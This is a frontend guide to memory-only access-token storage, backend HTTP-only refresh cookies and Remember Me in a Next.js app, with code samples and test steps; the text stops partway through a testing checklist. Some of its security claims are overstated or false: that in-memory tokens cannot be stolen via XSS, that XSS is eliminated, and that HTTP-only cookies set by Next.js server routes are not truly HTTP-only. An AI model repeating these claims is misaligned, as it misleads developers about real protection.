# Memory-Only Authentication & Remember Me - Frontend Implementation Guide

## 📖 Overview

This guide documents the frontend implementation of a **security-first authentication system** that eliminates XSS vulnerabilities through memory-only token storage and integrates with backend Remember Me functionality.

**What This Feature Does**:
- Stores access tokens ONLY in React state (memory, never in cookies or localStorage)
- Relies on backend HTTP-only cookies for session persistence
- Integrates with backend Remember Me (session-only vs 30-day persistence)
- Implements secure session restoration without frontend cookie manipulation
- Ensures backend-exclusive cookie management (frontend never touches auth cookies)

**Why We Built It This Way**:
- **XSS Protection**: Memory-only tokens cannot be stolen via JavaScript injection
- **Backend Authority**: Single source of truth for authentication state
- **Industry Standard**: Matches Auth0, Firebase, AWS Cognito patterns
- **Clean Separation**: Frontend handles UI/UX, backend handles security

**Prerequisites**:
- Backend Remember Me implementation (Phase 2, Oct 8 2025)
- Backend HTTP-only cookie infrastructure (Phase 1, Oct 8 2025)
- React Context API for state management
- Next.js 15.5.2 App Router
- GraphQL API integration

---

## 🎯 Problem Statement

### What Problem Does This Solve?

**Problem 1: Frontend Cookie Manipulation (XSS Vulnerability)**
- Previous implementation: Frontend manually created `auth-token` cookies using `document.cookie`
- Risk: JavaScript-accessible cookies can be stolen via XSS attacks
- Impact: Attackers could inject malicious scripts and steal authentication tokens

**Problem 2: Dual Storage Confusion**
- Tokens stored in BOTH backend HTTP-only cookies AND frontend regular cookies
- Led to "wrong user data" bug (stale cookies from previous user)
- Race conditions between two sources of truth
- Logout didn't clear all cookies consistently

**Problem 3: No Backend Remember Me Integration**
- Frontend had no way to tell backend "this is a trusted device"
- All sessions had same duration (7 days)
- No option for session-only authentication (public computer safety)

### Previous Approach and Its Limitations

**Before (Insecure - Sept 2025)**:
```typescript
// ❌ SECURITY VULNERABILITY (REMOVED Oct 8, 2025)
const login = async (email: string, password: string) => {
  const result = await authApi.signIn(email, password);
  
  if (result.success) {
    // Backend sets HTTP-only cookies ✅
    // BUT frontend ALSO sets regular cookies ❌
    document.cookie = `auth-token=${result.tokens.accessToken}; path=/; max-age=604800`;
    
    // Dual storage = confusion
    setAuthState({ accessToken: result.tokens.accessToken });
  }
};
```

**Limitations**:
- ❌ `auth-token` cookie accessible to JavaScript (XSS vulnerability)
- ❌ Dual storage created inconsistency (backend cookie vs frontend cookie)
- ❌ Frontend could override backend security decisions
- ❌ No integration with backend Remember Me functionality

### Requirements and Constraints

**Security Requirements**:
1. ✅ Access tokens stored ONLY in memory (React state)
2. ✅ Frontend NEVER creates or modifies authentication cookies
3. ✅ Backend exclusively manages all auth cookies (HTTP-only)
4. ✅ Session restoration without reading HTTP-only cookies
5. ✅ Logout calls backend to clear cookies (not frontend manipulation)

**Functional Requirements**:
1. ✅ Support backend Remember Me integration (session vs persistent)
2. ✅ Seamless session restoration on page refresh
3. ✅ Clear user feedback on authentication state
4. ✅ Graceful handling of expired sessions
5. ✅ Backward compatible with existing authentication flow

**Performance Constraints**:
1. ✅ No additional API calls for cookie management
2. ✅ Session restoration < 500ms
3. ✅ Memory-only storage has zero disk I/O

---

## 🏗️ Architecture & Design Decisions

### High-Level Architecture

```
┌─────────────────────────────────────────────────────────────────┐
│                    USER INITIATES LOGIN                          │
│  (Enters email, password, checks/unchecks Remember Me checkbox)  │
└───────────────────┬─────────────────────────────────────────────┘
                    │
                    ▼
┌─────────────────────────────────────────────────────────────────┐
│  AuthContext.tsx - login() function                              │
│  Calls: authApi.signIn(email, password, rememberMe)             │
└───────────────────┬─────────────────────────────────────────────┘
                    │
                    ▼
┌─────────────────────────────────────────────────────────────────┐
│  Backend GraphQL Mutation: auth.login()                          │
│  - Validates credentials                                         │
│  - Generates JWT tokens (access + refresh)                       │
│  - Sets HTTP-only cookies (refresh_token, client_fp, fp_hash)   │
│  - Returns accessToken in GraphQL response (NOT in cookies)      │
└───────────────────┬─────────────────────────────────────────────┘
                    │
                    ▼
┌─────────────────────────────────────────────────────────────────┐
│  Frontend Receives Response                                      │
│                                                                   │
│  ✅ Backend already set HTTP-only cookies:                       │
│     - refresh_token (session or 30 days based on rememberMe)    │
│     - client_fp (device fingerprint)                             │
│     - fp_hash (fingerprint validation)                           │
│                                                                   │
│  ✅ Frontend stores accessToken in React state ONLY:             │
│     setAuthState({                                               │
│       accessToken: result.tokens.accessToken,  // Memory only!  │
│       user: result.user,                                         │
│       isAuthenticated: true                                      │
│     })                                                            │
│                                                                   │
│  ❌ Frontend NEVER does: document.cookie = 'auth-token=...'      │
└─────────────────────────────────────────────────────────────────┘


┌─────────────────────────────────────────────────────────────────┐
│                    PAGE REFRESH / RELOAD                         │
└───────────────────┬─────────────────────────────────────────────┘
                    │
                    ▼
┌─────────────────────────────────────────────────────────────────┐
│  React state cleared (accessToken lost from memory)              │
│  HTTP-only cookies still present (backend-managed)               │
└───────────────────┬─────────────────────────────────────────────┘
                    │
                    ▼
┌─────────────────────────────────────────────────────────────────┐
│  AuthContext.tsx - checkExistingSession()                        │
│  Calls: refreshToken mutation (NO accessToken in request)       │
└───────────────────┬─────────────────────────────────────────────┘
                    │
                    ▼
┌─────────────────────────────────────────────────────────────────┐
│  Backend GraphQL Mutation: auth.refreshToken()                   │
│  - Reads refresh_token from HTTP-only cookie (secure)           │
│  - Validates token (signature, expiry, blacklist check)         │
│  - Generates NEW access token                                    │
│  - Rotates refresh token (blacklists old one)                   │
│  - Updates HTTP-only cookies with new refresh token             │
│  - Returns NEW accessToken in response                           │
└───────────────────┬─────────────────────────────────────────────┘
                    │
                    ▼
┌─────────────────────────────────────────────────────────────────┐
│  Frontend Restores Session                                       │
│  setAuthState({                                                  │
│    accessToken: newAccessToken,  // Fresh token in memory       │
│    user: userData,                                               │
│    isAuthenticated: true                                         │
│  })                                                               │
│  → User sees authenticated state without re-login                │
└─────────────────────────────────────────────────────────────────┘
```

### Why This Approach Over Alternatives

**Our Approach: Memory-Only Access Tokens + Backend HTTP-Only Refresh Tokens**

✅ **Pros**:
- XSS-proof: Access tokens not accessible to malicious JavaScript
- CSRF-protected: HTTP-only cookies cannot be read by JavaScript
- Clean separation: Frontend (UI) vs Backend (security)
- Industry standard: Auth0/Firebase/AWS Cognito pattern
- Session flexibility: Backend controls duration (session vs persistent)

❌ **Cons**:
- Access token lost on page refresh (requires backend call to restore)
- Slightly more complex than localStorage (but worth it for security)
- Requires backend integration (cannot work standalone)

🏆 **Why Chosen**: Security is non-negotiable. XSS vulnerabilities are critical, and this approach eliminates them entirely.

---

### Alternative Approaches Considered

#### Alternative 1: Store Access Token in Cookie (Frontend-Created)

**Implementation**:
```typescript
// ❌ REJECTED APPROACH
document.cookie = `access_token=${accessToken}; path=/; max-age=300`;
```

✅ **Pros**:
- Simple to implement
- Works across page refreshes
- No backend call needed for session restoration

❌ **Cons**:
- **CRITICAL SECURITY FLAW**: Cookie accessible to JavaScript (XSS vulnerability)
- Frontend can manipulate security-critical data
- Violates principle of least privilege
- OWASP explicitly warns against this

🚫 **Why Not Chosen**: Security risk too high. One XSS vulnerability compromises all user sessions.

---

#### Alternative 2: Store Refresh Token in localStorage

**Implementation**:
```typescript
// ❌ REJECTED APPROACH
localStorage.setItem('refresh_token', refreshToken);

// Session restoration
const storedRefresh = localStorage.getItem('refresh_token');
```

✅ **Pros**:
- Persists across page refreshes
- Easy to implement
- No cookie management needed

❌ **Cons**:
- **CRITICAL SECURITY FLAW**: localStorage accessible to JavaScript (XSS vulnerability)
- Refresh tokens are long-lived (7-30 days), higher risk than access tokens
- No HTTP-only protection
- Cannot be cleared by server (only client-side)

🚫 **Why Not Chosen**: Even worse than Alternative 1. Refresh tokens are more valuable to attackers (longer lifetime).

---

#### Alternative 3: Store Access Token in sessionStorage

**Implementation**:
```typescript
// ❌ REJECTED APPROACH
sessionStorage.setItem('access_token', accessToken);
```

✅ **Pros**:
- Cleared when browser tab closed (better than localStorage)
- Persists across page refreshes within same tab
- Simpler than memory-only approach

❌ **Cons**:
- **SECURITY FLAW**: sessionStorage accessible to JavaScript (XSS vulnerability)
- Tab-based, not browser-based (confusing UX)
- Still violates memory-only principle
- No integration with backend Remember Me

🚫 **Why Not Chosen**: Still vulnerable to XSS. Memory-only is superior.

---

#### Alternative 4: Store Both Tokens in Cookies (Frontend-Created)

**Implementation**:
```typescript
// ❌ REJECTED APPROACH
document.cookie = `access_token=${accessToken}; path=/; max-age=300`;
document.cookie = `refresh_token=${refreshToken}; path=/; max-age=2592000`;
```

✅ **Pros**:
- Works across page refreshes
- Familiar cookie-based pattern

❌ **Cons**:
- **CRITICAL DUAL VULNERABILITY**: Both tokens accessible to JavaScript
- Frontend can override backend security decisions
- No HTTP-only protection
- Dual storage creates inconsistency (frontend cookies vs backend cookies)

🚫 **Why Not Chosen**: Worst of all approaches. Combines XSS vulnerability with dual storage confusion.

---

### Trade-offs Considered

| Aspect | Decision | Trade-off |
|--------|----------|-----------|
| **Access Token Storage** | Memory only (React state) | Requires refresh on page reload vs persistent storage |
| **Refresh Token Storage** | Backend HTTP-only cookies | Frontend cannot access vs convenience |
| **Session Restoration** | Backend refresh call on mount | Additional API call vs reading cookies |
| **Remember Me Integration** | Backend-controlled duration | Frontend trusts backend vs frontend control |
| **Cookie Management** | Backend-exclusive | More backend code vs frontend flexibility |

**Philosophy**: Security first, convenience second. All trade-offs favor security when in conflict.

---

### Security Considerations

**Threat Model**:
1. ✅ **XSS Attacks**: Mitigated via memory-only storage (no persistent tokens accessible to JavaScript)
2. ✅ **CSRF Attacks**: Mitigated via SameSite=Strict cookies (backend-managed)
3. ✅ **Token Theft**: Mitigated via short-lived access tokens (5 min) + memory-only storage
4. ✅ **Cookie Manipulation**: Mitigated via HTTP-only cookies (JavaScript cannot modify)
5. ✅ **Session Fixation**: Mitigated via token rotation on refresh (backend)
6. ⚠️ **Memory Dumps**: Partially vulnerable (access token in RAM, but short-lived)

**Security Best Practices Followed**:
- OWASP Authentication Cheat Sheet ✅
- OWASP XSS Prevention Cheat Sheet ✅
- RFC 6749 (OAuth 2.0) Security Considerations ✅
- React Security Best Practices ✅

---

## 📦 Frontend Implementation (Step-by-Step)

### Step 1: Remove Frontend Cookie Manipulation

**File**: `skillsync-fe/context/AuthContext.tsx`

**What**: Remove ALL instances of `document.cookie` manipulation for authentication cookies

**Why**: Frontend-created cookies are JavaScript-accessible (XSS vulnerability). Backend must be the exclusive authority for authentication cookies.

**Changes Made**:

**Location 1: Login Function (Line ~447) - REMOVED**:
```typescript
// ❌ REMOVED - Oct 8, 2025 (Phase 1)
document.cookie = `auth-token=${credentialValidation.tokens.accessToken}; path=/; max-age=604800; SameSite=Strict`;

// ✅ NEW SECURE PATTERN - Memory-only storage
setAuthState(prev => ({
  ...prev,
  accessToken: credentialValidation.tokens.accessToken,  // Memory only!
  isAuthenticated: true,
  user: credentialValidation.user,
  tokenExpiresAt: Date.now() + (credentialValidation.expiresIn * 1000),
}));

console.log('🔐 Storing access token in memory only (secure)');
console.log('🍪 HTTP-only cookies set by backend: refresh_token, client_fp, fp_hash');
```

**Location 2: OTP Verification Function (Line ~732) - REMOVED**:
```typescript
// ❌ REMOVED - Oct 8, 2025 (Phase 1)
document.cookie = `auth-token=${otpVerificationResult.accessToken}; path=/; max-age=604800; SameSite=Strict`;

// ✅ NEW SECURE PATTERN - Memory-only storage
setAuthState(prev => ({
  ...prev,
  accessToken: otpVerificationResult.accessToken,  // Memory only!
  isAuthenticated: true,
  user: otpVerificationResult.user,
  tokenExpiresAt: Date.now() + (otpVerificationResult.expiresIn * 1000),
}));

console.log('🔐 OTP verified - token in memory only');
```

**Location 3: Signup Function (Line ~813) - REMOVED**:
```typescript
// ❌ REMOVED - Oct 8, 2025 (Phase 1)
document.cookie = `auth-token=${credentialValidation.tokens.accessToken}; path=/; max-age=604800; SameSite=Strict`;

// ✅ NEW SECURE PATTERN - Memory-only storage
setAuthState(prev => ({
  ...prev,
  accessToken: credentialValidation.tokens.accessToken,  // Memory only!
  isAuthenticated: true,
  user: credentialValidation.user,
  tokenExpiresAt: Date.now() + (credentialValidation.expiresIn * 1000),
}));

console.log('🔐 Signup successful - token in memory only');
```

**Explanation**:

**Why Remove `document.cookie`?**
- `document.cookie` creates cookies that JavaScript can READ and WRITE
- Even with `HttpOnly` in the cookie string, JavaScript-set cookies are NOT truly HTTP-only
- Browser only enforces HTTP-only when cookies are set via HTTP headers (server-side)
- Frontend-set cookies create XSS vulnerability (malicious script can steal tokens)

**What's the Correct Pattern?**
```typescript
// ✅ CORRECT: Backend sets HTTP-only cookies via HTTP response headers
// Frontend stores access token ONLY in React state (memory)

// Backend (Django/Strawberry):
response.set_cookie('refresh_token', refresh_token, httponly=True)  # True HTTP-only

// Frontend (React):
setAuthState({ accessToken: token })  // Memory only, cleared on refresh
```

**Common Mistake to Avoid**:
```typescript
// ❌ WRONG: This does NOT create HTTP-only cookie
document.cookie = 'auth-token=xyz; HttpOnly; Secure';
// Browser ignores HttpOnly flag when set via JavaScript
// Cookie IS accessible via document.cookie
```

---

### Step 2: Update Login Function for Remember Me

**File**: `skillsync-fe/context/AuthContext.tsx`

**What**: Modify login function to pass `rememberMe` parameter to backend and store access token in memory only

**Why**: Backend needs user's Remember Me preference to determine cookie duration (session vs 30 days). Frontend must trust backend's cookie management.

**Code**:
```typescript
const login = async (email: string, password: string, rememberMe = false) => {
  try {
    console.log('🔐 Starting login process...', { email, rememberMe });
    
    // 🔑 STEP 1: Call backend GraphQL login mutation with Remember Me flag
    const credentialValidation = await authApi.signIn(email, password, rememberMe);
    
    if (credentialValidation.success) {
      console.log('✅ Login successful!');
      
      // 🔑 STEP 2: Backend has already set HTTP-only cookies
      // These cookies are INACCESSIBLE to JavaScript (secure)
      // Cookies set by backend:
      // - refresh_token: HTTP-only, session or 30 days based on rememberMe
      // - client_fp: HTTP-only, device fingerprint
      // - fp_hash: HTTP-only, fingerprint hash for validation
      console.log('🍪 Backend set HTTP-only cookies (cannot see in document.cookie)');
      
      // 🔑 STEP 3: Store access token ONLY in React state (memory)
      // This token is:
      // - Short-lived (5 minutes)
      // - Cleared on page refresh (requires backend refresh call)
      // - NOT accessible to malicious scripts (not in cookies/localStorage)
      setAuthState(prev => ({
        ...prev,
        accessToken: credentialValidation.tokens.accessToken,  // Memory only!
        isAuthenticated: true,
        user: credentialValidation.user,
        tokenExpiresAt: Date.now() + (credentialValidation.expiresIn * 1000),
        isLoading: false,
        // OTP state cleared (successful login)
        otpRequired: false,
        pendingEmail: null,
        pendingPurpose: null,
      }));
      
      console.log('🔐 Access token stored in memory only (secure)');
      console.log('⏱️ Token expires in:', credentialValidation.expiresIn, 'seconds (5 minutes)');
      
      // ❌ REMOVED: document.cookie = 'auth-token=...'
      // Frontend NEVER creates auth cookies anymore
      
      // 🔑 STEP 4: Check if user needs onboarding
      if (needsOnboarding(credentialValidation.user)) {
        console.log('📋 User needs onboarding - redirecting...');
        setAuthState(prev => ({ ...prev, isRedirecting: true }));
        router.push('/onboarding');
      } else {
        console.log('✅ User fully onboarded - redirecting to dashboard...');
        setAuthState(prev => ({ ...prev, isRedirecting: true }));
        
        // Role-based redirect
        const redirectPath = getRoleBasedRedirect(credentialValidation.user.role);
        router.push(redirectPath);
      }
    } else {
      console.error('❌ Login failed:', credentialValidation.message);
      throw new Error(credentialValidation.message || 'Login failed');
    }
  } catch (error) {
    console.error('❌ Login error:', error);
    setAuthState(prev => ({ ...prev, isLoading: false }));
    throw error;
  }
};
```

**Explanation**:

**Line-by-line Breakdown**:

1. **`rememberMe = false`** - Default parameter (secure by default)
   - If user doesn't check "Remember me" checkbox → session-only cookie
   - If user checks checkbox → persistent 30-day cookie
   - Backend decides cookie duration, not frontend

2. **`authApi.signIn(email, password, rememberMe)`** - Pass flag to backend
   - Backend GraphQL mutation receives `rememberMe` in `LoginInput`
   - Backend calls `SecureTokenManager.set_secure_jwt_cookies(..., remember_me=rememberMe)`
   - Backend sets cookie `max_age=None` (session) or `max_age=2592000` (30 days)

3. **Backend already set HTTP-only cookies** - Key concept
   - These cookies are SET by backend via HTTP response headers
   - Frontend CANNOT see them in `document.cookie` (HTTP-only protection)
   - Frontend CANNOT modify them (backend exclusive)
   - Cookies include: `refresh_token`, `client_fp`, `fp_hash`

4. **`setAuthState({ accessToken: ... })`** - Memory-only storage
   - React `useState` stores data in component memory (RAM)
   - NOT persisted to disk (cookies, localStorage, sessionStorage)
   - Cleared when page refreshes or browser tab closes
   - Cannot be stolen via XSS (not accessible via JavaScript persistence APIs)

5. **`tokenExpiresAt: Date.now() + (expiresIn * 1000)`** - Expiry tracking
   - Frontend tracks when access token expires (5 minutes from now)
   - Used to trigger proactive token refresh (before expiry)
   - Improves UX (no sudden 401 errors mid-action)

**How This Connects to Backend**:
- Backend `auth/mutation.py` login mutation receives `remember_me` parameter
- Backend `auth/secure_utils.py` `set_secure_jwt_cookies()` uses flag to set `max_age`
- Backend `config/security.py` defines durations: `REFRESH_TOKEN_LIFETIME_SESSION` (None) vs `REFRESH_TOKEN_LIFETIME_REMEMBER` (30 days)

**Testing This Step**:
```typescript
// Test 1: Login WITHOUT Remember Me (session cookie)
await login('user@example.com', 'password', false);
// Expected: Backend sets session cookie (no expiry, deleted on browser close)

// Test 2: Login WITH Remember Me (persistent cookie)
await login('user@example.com', 'password', true);
// Expected: Backend sets persistent cookie (expires in 30 days)

// Verify in DevTools:
// 1. Open browser DevTools → Application → Cookies
// 2. Check refresh_token cookie:
//    - Session cookie: No "Expires" field
//    - Persistent cookie: "Expires" = ~30 days from now
```

---

### Step 3: Implement Secure Session Restoration

**File**: `skillsync-fe/context/AuthContext.tsx`

**What**: Update `checkExistingSession()` to restore session using backend refresh mutation ONLY, without reading HTTP-only cookies

**Why**: On page refresh, React state is cleared (access token lost). Frontend must call backend to get new access token using HTTP-only refresh token (which frontend cannot read).

**Code**:
```typescript
const checkExistingSession = async (): Promise<boolean> => {
  try {
    console.log('🔍 Checking for existing session...');
    
    // 🔑 KEY CONCEPT: On page refresh, React state is cleared
    // - accessToken is LOST (was stored in memory only)
    // - refresh_token cookie is STILL PRESENT (HTTP-only, backend-managed)
    // - Frontend CANNOT read refresh_token (HTTP-only protection)
    // - Frontend MUST call backend refresh mutation to restore session
    
    // ❌ REMOVED: Auth-token cookie fallback (Phase 1)
    // Old code tried to read 'auth-token' cookie as fallback
    // This defeated the purpose of memory-only storage
    
    // ✅ CORRECT: Call backend refresh mutation
    // Backend reads refresh_token from HTTP-only cookie
    // Backend generates NEW access token
    // Backend rotates refresh token (security)
    // Backend returns NEW access token in response
    const refreshed = await refreshToken();
    
    if (refreshed) {
      console.log('✅ Session restored successfully');
      console.log('🔐 New access token stored in memory');
      return true;
    } else {
      console.log('❌ No valid session found - user must login');
      return false;
    }
  } catch (error) {
    console.error('❌ Session restoration failed:', error);
    
    // Clear any stale state
    setAuthState({
      user: null,
      accessToken: null,
      isAuthenticated: false,
      isLoading: false,
      tokenExpiresAt: null,
      otpRequired: false,
      pendingEmail: null,
      pendingPurpose: null,
      deviceInfo: null,
      isRedirecting: false,
    });
    
    return false;
  }
};

const refreshToken = async (): Promise<boolean> => {
  try {
    console.log('🔄 Refreshing access token...');
    
    // 🔑 STEP 1: Call backend refresh mutation
    // No parameters needed - backend reads refresh_token from HTTP-only cookie
    const refreshResult = await authApi.refreshToken();
    
    if (refreshResult.success && refreshResult.accessToken) {
      console.log('✅ Token refresh successful');
      
      // 🔑 STEP 2: Get user data with new access token
      // Some backends include user data in refresh response
      // Others require separate "me" query
      let userData = refreshResult.user;
      
      if (!userData) {
        // Fetch user data if not included in refresh response
        console.log('📡 Fetching user data...');
        const meResult = await authApi.me(refreshResult.accessToken);
        userData = meResult.user;
      }
      
      // 🔑 STEP 3: Store new access token in memory
      setAuthState(prev => ({
        ...prev,
        accessToken: refreshResult.accessToken,  // Fresh token in memory
        user: userData,
        isAuthenticated: true,
        tokenExpiresAt: Date.now() + (refreshResult.expiresIn * 1000),
        isLoading: false,
      }));
      
      console.log('🔐 New access token stored in memory');
      console.log('⏱️ Token expires in:', refreshResult.expiresIn, 'seconds');
      
      return true;
    } else {
      console.log('❌ Token refresh failed:', refreshResult.message);
      return false;
    }
  } catch (error) {
    console.error('❌ Token refresh error:', error);
    return false;
  }
};
```

**Explanation**:

**Why NOT Read Cookies Directly?**
```typescript
// ❌ WRONG: Try to read HTTP-only cookie
const refreshToken = document.cookie
  .split('; ')
  .find(row => row.startsWith('refresh_token='))
  ?.split('=')[1];

// Problem: HTTP-only cookies are NOT in document.cookie
// They're invisible to JavaScript (security feature)
```

**Correct Pattern: Backend Reads Cookies**
```typescript
// ✅ CORRECT: Backend reads HTTP-only cookie
const refreshResult = await authApi.refreshToken();
// No token parameter needed!

// Backend implementation (Django):
refresh_token = request.COOKIES.get('refresh_token')  # Secure
```

**Session Restoration Flow**:
1. User refreshes page → React state cleared → `accessToken = null`
2. `useEffect` in AuthContext runs on mount
3. Calls `checkExistingSession()`
4. Calls `refreshToken()` mutation (NO parameters)
5. Backend reads `refresh_token` from HTTP-only cookie
6. Backend validates token (signature, expiry, blacklist)
7. Backend generates NEW access token
8. Backend rotates refresh token (blacklists old one)
9. Backend updates HTTP-only cookies with new refresh token
10. Backend returns NEW access token in GraphQL response
11. Frontend stores NEW access token in memory
12. Session restored! User sees authenticated state

**Why Token Rotation?**
- Security: Old refresh token is blacklisted after use
- Prevents replay attacks: If attacker steals old token, it's useless
- Implements "single use" refresh token pattern
- Backend maintains blacklist in database (`ninja_jwt_blacklist` table)

**Testing This Step**:
```typescript
// Test session restoration:
// 1. Login successfully
// 2. Refresh page (F5 or Ctrl+R)
// 3. Expected: User stays logged in (no redirect to login page)
// 4. Check console logs:
//    - "🔍 Checking for existing session..."
//    - "🔄 Refreshing access token..."
//    - "✅ Token refresh successful"
//    - "🔐 New access token stored in memory"

// Test expired session:
// 1. Login successfully
// 2. Wait 30+ days (or manually delete cookies in DevTools)
// 3. Refresh page
// 4. Expected: Redirect to login page (session expired)
```

---

### Step 4: Update Logout Function

**File**: `skillsync-fe/context/AuthContext.tsx`

**What**: Ensure logout calls backend mutation to clear HTTP-only cookies, remove frontend cookie clearing

**Why**: Only backend can properly clear HTTP-only cookies. Frontend clearing via `document.cookie` doesn't work for HTTP-only cookies and creates inconsistency.

**Code**:
```typescript
const logout = async () => {
  try {
    console.log('🚪 Starting logout process...');
    
    // 🔑 STEP 1: Call backend logout mutation
    // Backend will:
    // - Clear HTTP-only cookies (refresh_token, client_fp, fp_hash)
    // - Invalidate/blacklist current refresh token
    // - Clear Django session (if exists)
    await authApi.signOut();
    console.log('✅ Backend logout successful (cookies cleared by server)');
    
    // 🔑 STEP 2: Clear React state (memory)
    setAuthState({
      user: null,
      accessToken: null,
      isAuthenticated: false,
      isLoading: false,
      tokenExpiresAt: null,
      otpRequired: false,
      pendingEmail: null,
      pendingPurpose: null,
      deviceInfo: null,
      isRedirecting: false,
    });
    console.log('🧹 Frontend state cleared');
    
    // ❌ REMOVED: Frontend cookie clearing (Phase 1)
    // Old code:
    // document.cookie = 'auth-token=; expires=Thu, 01 Jan 1970 00:00:00 UTC; path=/;';
    // document.cookie = 'refresh_token=; expires=Thu, 01 Jan 1970 00:00:00 UTC; path=/;';
    
    // Why removed:
    // - HTTP-only cookies CANNOT be deleted via document.cookie
    // - Creates false sense of security (cookies still exist)
    // - Backend must clear HTTP-only cookies via HTTP response headers
    
    // 🔑 STEP 3: Redirect to login page
    setAuthState(prev => ({ ...prev, isRedirecting: true }));
    router.push('/auth/login');
    console.log('🔐 Redirected to login page');
    
  } catch (error) {
    console.error('❌ Logout error:', error);
    
    // Even if backend logout fails, clear frontend state
    // This ensures user sees logged-out UI
    setAuthState({
      user: null,
      accessToken: null,
      isAuthenticated: false,
      isLoading: false,
      tokenExpiresAt: null,
      otpRequired: false,
      pendingEmail: null,
      pendingPurpose: null,
      deviceInfo: null,
      isRedirecting: false,
    });
    
    // Still redirect to login
    router.push('/auth/login');
  }
};
```

**Explanation**:

**Why Backend Must Clear Cookies?**
```typescript
// ❌ WRONG: Frontend tries to clear HTTP-only cookie
document.cookie = 'refresh_token=; expires=Thu, 01 Jan 1970 00:00:00 UTC';
// Result: Cookie still exists! (HTTP-only cannot be deleted by JavaScript)

// ✅ CORRECT: Backend clears cookie via HTTP response header
response.set_cookie('refresh_token', '', expires='Thu, 01 Jan 1970 00:00:00 GMT')
// Result: Cookie properly deleted (browser removes it)
```

**Backend Logout Implementation** (`auth/mutation.py`):
```python
@strawberry.mutation
async def logout(self, info) -> LogoutPayload:
    try:
        # Clear all HTTP-only cookies (backend exclusive)
        response = info.context.response
        if response:
            SecureTokenManager.clear_secure_cookies(response)
        
        return LogoutPayload(success=True, message="Logged out successfully")
    except Exception as e:
        return LogoutPayload(success=False, message=str(e))
```

**Backend Cookie Clearing** (`auth/secure_utils.py`):
```python
@staticmethod
def clear_secure_cookies(response):
    """Clear all authentication cookies"""
    cookies_to_clear = [
        'auth-token',      # Legacy (from old implementation)
        'refresh_token',   # Current HTTP-only refresh token
        'user-role',       # Legacy
        'client_fp',       # Device fingerprint
        'fp_hash',         # Fingerprint hash
        'sessionid',       # Django session
    ]
    
    for cookie_name in cookies_to_clear:
        response.set_cookie(
            cookie_name,
            '',  # Empty value
            max_age=0,  # Expire immediately
            expires='Thu, 01 Jan 1970 00:00:00 GMT',  # Past date
            httponly=True,
            secure=not settings.DEBUG,
            samesite='Strict',
            path='/',
        )
    
    return response
```

**Testing Logout**:
```bash
# Test 1: Complete logout flow
# 1. Login successfully
# 2. Verify cookies exist in DevTools (refresh_token, client_fp, fp_hash)
# 3. Click logout button
# 4. Expected: Redirect to login page
# 5. Check DevTools → Application → Cookies
#    Expected: All auth cookies deleted (refresh_token, client_fp, fp_hash)

# Test 2: Verify state cleared
# 1. After logout, open console
# 2. Check: authState should be null/empty
# 3. Check: No access token in memory
# 4. Try to access protected route
#    Expected: Redirect to login (not authenticated)

# Test 3: Backend logout failure handling
# 1. Disconnect backend server
# 2. Try to logout
# 3. Expected: Frontend still clears state and redirects
# 4. User sees logged-out UI (graceful degradation)
```

---

### Step 5: Remove Cookie Setting from Onboarding Completion

**File**: `skillsync-fe/app/api/onboarding/complete/route.ts`

**What**: Remove frontend cookie setting after onboarding completion

**Why**: Backend already sets HTTP-only cookies and returns access token in response. Frontend cookie setting is redundant and creates dual storage vulnerability.

**Before (Insecure)**:
```typescript
// ❌ REMOVED - Oct 8, 2025 (Phase 1)
import { NextResponse } from 'next/server';

export async function POST(request: Request) {
  try {
    // ... onboarding completion logic ...
    
    const response = NextResponse.json({ success: true, user: userData });
    
    // ❌ SECURITY ISSUE: Frontend sets cookie
    response.cookies.set('auth-token', accessToken, {
      httpOnly: true,  // This doesn't work when set by Next.js frontend!
      secure: process.env.NODE_ENV === 'production',
      sameSite: 'strict',
      maxAge: 604800,
      path: '/',
    });
    
    return response;
  } catch (error) {
    return NextResponse.json({ error: error.message }, { status: 500 });
  }
}
```

**After (Secure)**:
```typescript
// ✅ SECURE - Oct 8, 2025 (Phase 1)
import { NextResponse } from 'next/server';

export async function POST(request: Request) {
  try {
    // Call backend GraphQL mutation: completeOnboarding
    const result = await fetch('http://localhost:8000/graphql/', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        // Include any auth headers needed
      },
      credentials: 'include',  // Send HTTP-only cookies
      body: JSON.stringify({
        query: `
          mutation CompleteOnboarding($input: CompleteOnboardingInput!) {
            onboarding {
              completeOnboarding(input: $input) {
                success
                message
                accessToken
                user { id email role }
              }
            }
          }
        `,
        variables: { input: onboardingData },
      }),
    });
    
    const data = await result.json();
    
    if (data.data.onboarding.completeOnboarding.success) {
      // ✅ Backend already set HTTP-only cookies
      // ✅ Backend returns accessToken in response
      // ✅ Frontend just returns data (no cookie manipulation)
      
      return NextResponse.json({
        success: true,
        accessToken: data.data.onboarding.completeOnboarding.accessToken,
        user: data.data.onboarding.completeOnboarding.user,
      });
    } else {
      return NextResponse.json(
        { error: data.data.onboarding.completeOnboarding.message },
        { status: 400 }
      );
    }
  } catch (error) {
    console.error('Onboarding completion error:', error);
    return NextResponse.json(
      { error: 'Failed to complete onboarding' },
      { status: 500 }
    );
  }
}
```

**Explanation**:

**Why NextResponse.cookies.set() is Problematic**:
- Next.js API routes run on the server (not browser)
- Setting cookies via Next.js creates regular cookies, NOT truly HTTP-only
- Creates confusion: Which service sets cookies? Frontend or backend?
- Violates single source of truth principle

**Correct Pattern**:
```typescript
// ✅ Backend sets HTTP-only cookies (Django)
// ✅ Backend returns accessToken in GraphQL response
// ✅ Frontend receives response and stores accessToken in memory
// ✅ Frontend NEVER sets cookies (backend exclusive)
```

**How Frontend Uses Onboarding Response**:
```typescript
// In AuthContext or onboarding component:
const completeOnboarding = async (data) => {
  const response = await fetch('/api/onboarding/complete', {
    method: 'POST',
    body: JSON.stringify(data),
  });
  
  const result = await response.json();
  
  if (result.success) {
    // Store access token in memory (React state)
    setAuthState(prev => ({
      ...prev,
      accessToken: result.accessToken,
      user: result.user,
      isAuthenticated: true,
    }));
    
    // ❌ NEVER: document.cookie = 'auth-token=...'
  }
};
```

---

## 🧪 Testing Frontend Changes

### Manual Testing Checklist

**Test 1: Login WITHOUT Remember Me (Session Cookie)**
```bash
# Steps:
1. Open http://localhost:3000/auth/login
2. Enter credentials
3. UNCHECK "Remember me" checkbox (or leave unchecked)
4. Click "Sign In"

# Expected Results:
✅ Login successful
✅ Redirected to dashboard
✅ DevTools → Application → Cookies shows:
   - refresh_token: NO "Expires" field (session cookie)
   - client_fp: NO "Expires" field
   - fp_hash: NO "Expires" field
✅ Console shows: "🔐 Setting SESSION cookies (browser close = logout)"

# Test Session Behavior:
5. Close ALL browser windows
6. Reopen browser
7. Navigate to http://localhost:3000

# Expected:
